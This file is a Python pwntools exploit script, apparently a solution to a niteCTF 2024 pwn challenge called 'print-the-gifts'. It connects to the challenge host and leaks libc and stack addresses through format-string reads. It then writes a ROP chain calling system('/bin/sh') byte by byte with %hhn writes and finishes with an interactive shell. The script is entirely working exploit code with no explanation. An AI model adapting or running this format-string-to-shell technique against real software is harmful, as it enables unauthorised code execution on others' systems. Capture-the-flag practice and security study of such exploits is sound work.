#!/usr/bin/env python3


from pwn import *


e = ELF("./chall_patched")
#r = process("./chall_patched")
libc = ELF("./libc.so.6")
r = remote("print-the-gifts.chals.nitectf2024.live",1337,ssl=True)
r.sendlineafter(b">",b"%23$p")
r.recvuntil(b"Santa brought you a ")
libc_base = int(r.recvline().strip(),16) - 0x2724a
log.info("The libc base of the process is " + hex(libc_base))
r.sendlineafter(b":",b"y")
r.sendlineafter(b">",b"%27$p")
r.recvuntil(b"Santa brought you a ")
stack_leak = int(r.recvline().strip(),16) - 0x188
log.info("The stack leak of the process is " + hex(stack_leak))
write_1 = b"%237c" + b"%10$hhn    "  + p64(stack_leak + 0x78)
r.sendlineafter(b":",b"y")
r.sendlineafter(b">",write_1)
r.sendlineafter(b":",b"y")
system = libc_base + libc.sym.system
pop_rdi = libc_base + 0x277e5
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
ret = pop_rdi + 1
for i in range(0,6):
    val = (pop_rdi >> (i * 8))%256
    if(val > 100):
        write_2 = f"%{val}c".encode() + b"%10$hhn    " + p64(stack_leak + 0x78 + i)
    elif(val > 10):
        write_2 = f"%{val}c".encode() + b"%10$hhn     " + p64(stack_leak + 0x78 + i)
    else:
        write_2 = f"%{val}c".encode() + b"%10$hhn      " + p64(stack_leak + 0x78 + i)

    r.sendlineafter(b">",write_2)
    r.sendlineafter(b":",b"y")
for i in range(0,6):
    val = (bin_sh >> (i * 8))%256
    if(val > 100):
        write_2 = f"%{val}c".encode() + b"%10$hhn    " + p64(stack_leak + 0x80 + i)
    elif(val > 10):
        write_2 = f"%{val}c".encode() + b"%10$hhn     " + p64(stack_leak + 0x80 + i)
    else:
        write_2 = f"%{val}c".encode() + b"%10$hhn      " + p64(stack_leak + 0x80 + i)

    r.sendlineafter(b">",write_2)
    r.sendlineafter(b":",b"y")
for i in range(0,6):
    val = (ret >> (i * 8))%256
    if(val > 100):
        write_2 = f"%{val}c".encode() + b"%10$hhn    " + p64(stack_leak + 0x88 + i)
    elif(val > 10):
        write_2 = f"%{val}c".encode() + b"%10$hhn     " + p64(stack_leak + 0x88 + i)
    else:
        write_2 = f"%{val}c".encode() + b"%10$hhn      " + p64(stack_leak + 0x88 + i)

    r.sendlineafter(b">",write_2)
    r.sendlineafter(b":",b"y")

for i in range(0,6):
    val = (system >> (i * 8))%256
    if(val > 100):
        write_2 = f"%{val}c".encode() + b"%10$hhn    " + p64(stack_leak + 0x90 + i)
    elif(val > 10):
        write_2 = f"%{val}c".encode() + b"%10$hhn     " + p64(stack_leak + 0x90 + i)
    else:
        write_2 = f"%{val}c".encode() + b"%10$hhn      " + p64(stack_leak + 0x90 + i)

    r.sendlineafter(b">",write_2)
    r.sendlineafter(b":",b"y")

r.sendlineafter(b">",b"n")
r.sendlineafter(b":",b"n")
r.interactive()
